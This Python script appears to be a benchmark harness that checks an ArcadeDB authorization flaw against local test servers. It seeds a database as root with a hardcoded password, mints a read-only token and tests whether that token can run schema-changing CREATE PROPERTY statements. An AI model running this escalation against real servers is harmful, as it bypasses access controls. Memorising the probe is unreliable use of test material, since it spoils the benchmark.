#!/usr/bin/env python3
"""Method-side executable probe for arcadedb-cve-2026-54076 (seed: CVE-2026-44221).
Usage: python3 seed_exec.py <candidate.json> [version]

Executes the candidate's DDL (a CREATE PROPERTY payload) with a READ-ONLY ArcadeDB API token
over external HTTP, then verifies the schema state with an admin query. Effect channel = schema
state (the injected property name lands in the type's property set), surfaced in the JSON 'body'
field; verify.sh greps the per-run flag there.

Seeding (create db / type / mint token) is ROOT; the ATTACK uses only the read-only token.
"""
import base64
import json
import os
import re
import sys
import time
import urllib.error
import urllib.request
import uuid

BASE = {
    "v0": "http://127.0.0.1:24801",
    "v1": "http://127.0.0.1:24802",
}

DB, TYPE = "pcb", "Widget"
ROOT_USER, ROOT_PW = "root", "playwithdata"


def _req(base, method, path, body=None, auth=None, timeout=30):
    url = base.rstrip("/") + path
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, method=method)
    r.add_header("Content-Type", "application/json")
    if auth == "root":
        tok = base64.b64encode(f"{ROOT_USER}:{ROOT_PW}".encode()).decode()
        r.add_header("Authorization", "Basic " + tok)
    elif auth:
        r.add_header("Authorization", "Bearer " + auth)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:  # noqa: BLE001
        return -1, str(e)


def wait_ready(base, secs=180):
    for _ in range(secs):
        st, _b = _req(base, "GET", "/api/v1/ready")
        if st in (200, 204):
            return True
        time.sleep(1)
    return False


def root_sql(base, sql, endpoint="command"):
    return _req(base, "POST", f"/api/v1/{endpoint}/{DB}",
                {"language": "sql", "command": sql}, auth="root")


def mint_token(base, salt):
    perms = {"database": [], "types": {"*": {"access": ["readRecord"]}}}
    st, body = _req(base, "POST", "/api/v1/server/api-tokens",
                    {"name": "readonly_%s_%s" % (salt, uuid.uuid4().hex[:8]),
                     "database": DB, "permissions": perms}, auth="root")
    try:
        return json.loads(body)["result"]["token"]
    except Exception:  # noqa: BLE001
        return None


def schema_props(base):
    st, body = root_sql(base,
                        "SELECT name, properties FROM schema:types WHERE name = '%s'" % TYPE,
                        endpoint="query")
    props = set()
    try:
        for row in json.loads(body).get("result", []):
            for p in row.get("properties", []) or []:
                props.add(p.get("name") if isinstance(p, dict) else p)
    except Exception:  # noqa: BLE001
        pass
    return props


def run_probe(candidate, *, version="v1"):
    base = BASE[version]
    ddl = candidate.get("ddl", "") if isinstance(candidate, dict) else ""
    if not ddl:
        return {"version": version, "error": "missing ddl in candidate"}
    if not wait_ready(base):
        return {"version": version, "error": "server never became ready (%s)" % base}
    # seeding as ROOT (idempotent; re-runs on leftovers just error harmlessly)
    _req(base, "POST", "/api/v1/server", {"command": "create database %s" % DB}, auth="root")
    root_sql(base, "CREATE DOCUMENT TYPE %s IF NOT EXISTS" % TYPE)
    root_sql(base, "CREATE PROPERTY %s.label STRING" % TYPE)
    token = mint_token(base, "seed_" + uuid.uuid4().hex[:8])
    if not token:
        return {"version": version, "error": "could not mint read-only token"}
    before = schema_props(base)
    st, body = _req(base, "POST", "/api/v1/command/%s" % DB,
                    {"language": "sql", "command": ddl}, auth=token)
    after = schema_props(base)
    m = re.search(r"CREATE\s+PROPERTY\s+[^\s.]+\.([^\s]+)", ddl, re.IGNORECASE)
    newprop = (m.group(1).strip() if m else "") or ""
    created = bool(newprop) and (newprop in after) and (newprop not in before) \
        and (200 <= st < 300)
    return {
        "version": version,
        "probe_id": candidate.get("probe_id"),
        "ddl_status": st,
        "new_prop": newprop,
        "created": created,
        "body": "ddl_status=%s created=%s schema_after=%s"
                % (st, created, sorted(x for x in after if x)),
    }


# 平台动态端口覆盖（compose 已转 PORT_ 动态端口；seed_exec 的 BASE 由 PCB_TARGET_PORT 覆盖）
import os as _os_pcb
_pbt = _os_pcb.environ.get("PCB_TARGET_BASE")
if _pbt:
    for _d in ("BASE", "HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                globals()[_d][_v] = _pbt
_pt = _os_pcb.environ.get("PCB_TARGET_PORT")
if _pt:
    if "BASE" in globals() and isinstance(globals()["BASE"], dict):
        for _v in list(globals()["BASE"]):
            globals()["BASE"][_v] = f"http://127.0.0.1:{int(_pt)}"


if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    r = run_probe(cand, version=version)
    print(json.dumps(r, default=str))
    if r.get("error"):
        sys.exit(2)  # 环境/协议失败 -> verify.sh 判 20
